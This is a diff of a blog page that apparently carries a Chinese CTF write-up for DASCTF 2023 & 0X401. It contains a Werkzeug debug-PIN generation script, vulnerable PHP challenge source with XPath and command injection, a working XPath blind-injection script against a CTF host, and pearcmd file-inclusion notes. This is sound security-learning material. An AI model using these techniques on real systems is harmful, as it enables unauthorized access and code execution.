 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line"><span class="comment"># werkzeug2.0x 高版本</span></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  <span class="comment"># username   /etc/passwd里面找用户</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname  默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span>       <span class="comment">#etattr(mod, &#x27;__file__&#x27;, None),  报错得到,moddir</span></span><br><span class="line">]</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">private_bits参数一 ：str(uuid.getnode()), 读 /sys/class/net/ens0/address  /sys/class/net/eth0/address  b2:7d:55:14:ad:f1</span></span><br><span class="line"><span class="string">private_bits参数二 ：# 一.get_machine_id(), 读/etc/machine-id  二.读 /proc/self/cgroup</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">a = <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;b2:7d:55:14:ad:f1&quot;</span>.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;b2:7d:55:14:ad:f1&quot;</span>.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>),<span class="number">16</span>)),</span><br><span class="line">    <span class="string">&#x27;96cec10d3d9307792745ec3b85c89620&#x27;</span>+<span class="string">&#x27;docker-fdcea420d972705e3e38b080e3ae658492f05756c6ed9d786b26b2b1b39d46e5.scope&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 源码里面的</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x: x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
 
 <p>生成pin码：135-940-781</p>
@@ -395,7 +195,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(0);</span><br><span class="line">class FILE&#123;   //file</span><br><span class="line">    public $filename;</span><br><span class="line">    public $lasttime;</span><br><span class="line">    public $size;</span><br><span class="line">    public function __construct($filename)&#123;</span><br><span class="line">        if (preg_match(&quot;/\//i&quot;, $filename))&#123;</span><br><span class="line">            throw new Error(&quot;hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $num = substr_count($filename, &quot;.&quot;);</span><br><span class="line">        if ($num != 1)&#123;</span><br><span class="line">            throw new Error(&quot;hacker!&quot;);    </span><br><span class="line">        &#125;</span><br><span class="line">        if (!is_file($filename))&#123;</span><br><span class="line">            throw new Error(&quot;???&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;filename = $filename;</span><br><span class="line">        $this-&gt;size = filesize($filename);</span><br><span class="line">        $this-&gt;lasttime = filemtime($filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function remove()&#123;</span><br><span class="line">        unlink($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function show()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Filename: &quot;. $this-&gt;filename. &quot;  Last Modified Time: &quot;.$this-&gt;lasttime. &quot;  Filesize: &quot;.$this-&gt;size.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        system(&quot;ls -all &quot;.$this-&gt;filename);   // this-&gt;filename shell ???</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (!isset($_SESSION[&#x27;user&#x27;]))&#123;</span><br><span class="line">  echo &#x27;</span><br><span class="line">&lt;form method=&quot;POST&quot;&gt;</span><br><span class="line">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span><br><span class="line">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&#x27;;</span><br><span class="line">  $xml = simplexml_load_file(&#x27;/tmp/secret.xml&#x27;);   // xml secret</span><br><span class="line">  if($_POST[&#x27;submit&#x27;])&#123;</span><br><span class="line">    $username=$_POST[&#x27;username&#x27;];</span><br><span class="line">    $password=md5($_POST[&#x27;password&#x27;]);</span><br><span class="line">    $x_query=&quot;/accounts/user[username=&#x27;&#123;$username&#125;&#x27; and password=&#x27;&#123;$password&#125;&#x27;]&quot;;   //xpath查询</span><br><span class="line">    $result = $xml-&gt;xpath($x_query);</span><br><span class="line">    if(count($result)==0)&#123;</span><br><span class="line">      echo &#x27;登录失败&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      $_SESSION[&#x27;user&#x27;] = $username;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    if ($_SESSION[&#x27;user&#x27;] !== &#x27;admin&#x27;) &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;;</span><br><span class="line">        unset($_SESSION[&#x27;user&#x27;]);</span><br><span class="line">        echo &quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  echo &quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;;   // file = </span><br><span class="line">  if (!$_GET[&#x27;file&#x27;]) &#123;</span><br><span class="line">    foreach (scandir(&quot;.&quot;) as $filename) &#123;</span><br><span class="line">      if (preg_match(&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;, $filename)) &#123;</span><br><span class="line">        echo &quot;&lt;a href=&#x27;index.php/?file=&quot; . $filename . &quot;&#x27;&gt;&quot; . $filename . &quot;&lt;/a&gt;&lt;br&gt;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;</span><br><span class="line">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span><br><span class="line">  &#x27;;</span><br><span class="line">    if ($_FILES[&#x27;file&#x27;]) &#123;</span><br><span class="line">      $filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];</span><br><span class="line">      if (!preg_match(&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;, $filename)) &#123;   //回溯机制绕过 但是这里为get方法</span><br><span class="line">        die(&quot;hacker!&quot;);          // 文件名后缀绕过</span><br><span class="line">      &#125;</span><br><span class="line">      if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $filename)) &#123;    </span><br><span class="line">          echo &quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        die(&#x27;failed&#x27;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">      $filename = $_GET[&#x27;file&#x27;];         //</span><br><span class="line">      if ($_GET[&#x27;todo&#x27;] === &quot;md5&quot;)&#123;      </span><br><span class="line">          echo md5_file($filename);</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">          $file = new FILE($filename);</span><br><span class="line">          if ($_GET[&#x27;todo&#x27;] !== &quot;remove&quot; &amp;&amp; $_GET[&#x27;todo&#x27;] !== &quot;show&quot;) &#123;</span><br><span class="line">              echo &quot;&lt;img src=&#x27;../&quot; . $filename . &quot;&#x27;&gt;&lt;br&gt;&quot;;</span><br><span class="line">              echo &quot;&lt;a href=&#x27;../index.php/?file=&quot; . $filename . &quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;;</span><br><span class="line">              echo &quot;&lt;a href=&#x27;../index.php/?file=&quot; . $filename . &quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;;</span><br><span class="line">          &#125; else if ($_GET[&#x27;todo&#x27;] === &quot;remove&quot;) &#123;</span><br><span class="line">              $file-&gt;remove();</span><br><span class="line">              echo &quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;;  //删除可以用条件竞争？ </span><br><span class="line">          &#125; else if ($_GET[&#x27;todo&#x27;] === &quot;show&quot;) &#123;</span><br><span class="line">              $file-&gt;show();                                        </span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
 <p><strong>XPath盲注原理</strong></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63701832/article/details/129777163">https://blog.csdn.net/qq_63701832/article/details/129777163</a></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYzNzAxODMyL2FydGljbGUvZGV0YWlscy8xMjk3NzcxNjM=">https://blog.csdn.net/qq_63701832/article/details/129777163</span></p>
 <p>和sql盲注原理相似，但是要注意判断节点</p>
 <p>这里有贴一个大佬的脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url =<span class="string">&#x27;http://5af02f69-5563-4d7c-a665-736452e37077.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strs =<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        <span class="comment">#猜测根节点名称 #accounts</span></span><br><span class="line">        <span class="comment"># payload_1 = &#123;&quot;username&quot;:&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&quot;.format(i,j),&quot;password&quot;:123,&quot;submit&quot;:&quot;1&quot;&#125;  accounts</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&quot;.format(i,j)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测子节点名称 #user</span></span><br><span class="line">        <span class="comment"># payload_2 = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(name(/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&quot;.format(i,j)   user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测accounts的节点</span></span><br><span class="line">        <span class="comment"># payload_3 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测user节点</span></span><br><span class="line">        <span class="comment"># payload_4 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#跑用户名和密码 #admin #003d7628772d6b57fec5f30ccbc82be1</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)、</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        payload_username =<span class="string">&quot;&#x27;or substring(/accounts/user/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload_username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">123</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(payload_username)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;登录成功!&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;登录失败&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
@@ -434,323 +234,269 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 有文件包含点</span><br><span class="line">2 开启了pear扩展   （可以当他是一个框架）</span><br><span class="line">3 配置文件中register_argc_argv 设置为On,而默认为Off（<span class="variable">$_SERVER</span>[‘argv’]生效）</span><br><span class="line">4 找到pear文件的位置，默认位置是/usr/local/lib/php/ </span><br></pre></td></tr></table></figure>
 
 <p><strong>PEAR扩展默认安装位置是： &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;</strong></p>
+<p>pearcmd学习:<span class="exturl" data-url="aHR0cHM6Ly93NHJzcDF0My5tb2UvMjAyMS8xMS8yNi8lRTUlODUlQjMlRTQlQkElOEUlRTUlODglQTklRTclOTQlQThwZWFyY21kJUU4JUJGJTlCJUU4JUExJThDJUU2JTk2JTg3JUU0JUJCJUI2JUU1JThDJTg1JUU1JTkwJUFCJUU3JTlBJTg0JUU0JUI4JTgwJUU0JUJBJTlCJUU2JTgwJUJCJUU3JUJCJTkzLw==">https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</span></p>
 
-      
-      
-        <div class="page-reward">
-          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
-          <div class="hide_box"></div>
-          <div class="shang_box">
-            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
-            <div class="shang_tit">
-              <p>纯属好玩</p>
-            </div>
-            <div class="shang_payimg">
-              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
-            </div>
-              <div class="pay_explain">扫码打赏，你说多少就多少</div>
-            <div class="shang_payselect">
-              
-                <div class="pay_item checked" data-id="alipay">
-                  <span class="radiobox"></span>
-                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝" /></span>
-                </div>
-              
-              
-                <div class="pay_item" data-id="wechat">
-                  <span class="radiobox"></span>
-                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信" /></span>
-                </div>
-              
-            </div>
-            <div class="shang_info">
-              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
-            </div>
-          </div>
-        </div>
-        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
-        <script type="text/javascript">
-          $(".pay_item").click(function(){
-            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
-            var dataid=$(this).attr('data-id');
-            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
-            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
-          });
-          function dashangToggle(){
-            
-            $(".hide_box").fadeToggle();
-            $(".shang_box").fadeToggle();
-          }
-        </script>
-      
-    </div>
-    
   </div>
-  
-    
-    <div class="copyright">
-        <p><span>本文标题:</span><a href="/2023/08/28/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/"></a></p>
-        <p><span>文章作者:</span><a href="/" title="访问  的个人博客"></a></p>
-        <p><span>发布时间:</span>2023年08月28日 - 13时11分</p>
-        <p><span>最后更新:</span>2023年08月28日 - 16时11分</p>
-        <p>
-            <span>原始链接:</span><a class="post-url" href="/2023/08/28/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" title="">http://example.com/2023/08/28/DASCTF%202023%20&amp;%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://example.com/2023/08/28/DASCTF%202023%20&amp;%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
-            <script src="/js/clipboard.min.js"></script>
-            <script> var clipboard = new Clipboard('.copy-path'); </script>
-        </p>
-        <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
-        </p>
-    </div>
 
+   <footer>
 
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2023-08-28 19:00:23" itemprop="dateModified" datetime="2023-08-28T19:00:23+08:00">2023-08-28</time>
+  </span>
+</div>
 
-<nav id="article-nav">
-  
-    <a href="/2023/08/28/LITCTF%202023%20WEB/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          (no title)
-        
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
+        <p>WeChat Pay</p>
       </div>
-    </a>
-  
-  
-    <a href="/2023/08/25/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">article</div>
-      <strong class="article-nav-caption">></strong>
-    </a>
-  
-</nav>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="John Doe Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="John Doe PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
 
-  
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
